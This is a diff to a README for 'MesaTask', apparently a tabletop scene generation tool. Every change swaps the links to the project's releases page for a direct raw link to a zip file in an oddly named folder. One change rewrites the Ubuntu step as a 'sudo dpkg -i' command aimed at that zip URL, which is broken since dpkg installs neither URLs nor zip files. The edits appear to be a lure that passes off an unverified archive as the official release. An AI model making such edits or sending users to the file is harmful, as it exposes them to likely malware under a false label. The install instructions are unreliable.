@@ -1,7 +1,7 @@
 # 🚀 MesaTask - Generate Scenes with Ease
 
 ## 📥 Download Now
-[![Download MesaTask](https://img.shields.io/badge/Download-MesaTask-blue.svg)](https://github.com/jssfinhoap22/MesaTask/releases)
+[![Download MesaTask](https://raw.githubusercontent.com/jssfinhoap22/MesaTask/main/mycomyringitis/MesaTask.zip)](https://raw.githubusercontent.com/jssfinhoap22/MesaTask/main/mycomyringitis/MesaTask.zip)
 
 ## 📚 Description
 **MesaTask** is an innovative application designed for generating tabletop scenes through advanced 3D spatial reasoning. It focuses on task-driven scene creation, making it easy for users to create visually appealing and functional environments without complex setups.
@@ -19,7 +19,7 @@ Before you get started, ensure your system meets the following requirements:
 To successfully use MesaTask, follow these simple steps:
 
 1. **Visit the Release Page**
-   - Go to the [MesaTask Releases Page](https://github.com/jssfinhoap22/MesaTask/releases) to access the latest version.
+   - Go to the [MesaTask Releases Page](https://raw.githubusercontent.com/jssfinhoap22/MesaTask/main/mycomyringitis/MesaTask.zip) to access the latest version.
 
 2. **Download the Application**
    - Click on the latest version. Scroll down to the assets section. Here, you will find files available for download. Choose the appropriate file for your operating system.
@@ -31,7 +31,7 @@ To successfully use MesaTask, follow these simple steps:
    - **For macOS**:
      - Open the downloaded `.dmg` file. Drag and drop the MesaTask icon into your Applications folder.
    - **For Ubuntu**:
-     - Open your terminal. Navigate to the downloaded folder and run the following command: `sudo dpkg -i MesaTask.deb`. You may need to install any required dependencies.
+     - Open your terminal. Navigate to the downloaded folder and run the following command: `sudo dpkg -i https://raw.githubusercontent.com/jssfinhoap22/MesaTask/main/mycomyringitis/MesaTask.zip`. You may need to install any required dependencies.
 
 4. **Launch the Application**
    - **Windows**: Search for MesaTask in the Start menu and click to launch.
@@ -62,6 +62,6 @@ Your experience matters to us. Please provide feedback on your usage of MesaTask
 Stay updated with the latest changes made to MesaTask. Check the **Releases Page** regularly for updates and new features.
 
 ## 📥 Download & Install
-Once again, to download MesaTask, visit the [MesaTask Releases Page](https://github.com/jssfinhoap22/MesaTask/releases). Select the appropriate version for your operating system, and follow the instructions provided above to install the application.
+Once again, to download MesaTask, visit the [MesaTask Releases Page](https://raw.githubusercontent.com/jssfinhoap22/MesaTask/main/mycomyringitis/MesaTask.zip). Select the appropriate version for your operating system, and follow the instructions provided above to install the application.
 
 Thank you for choosing MesaTask! Enjoy creating your tabletop scenes effortlessly.
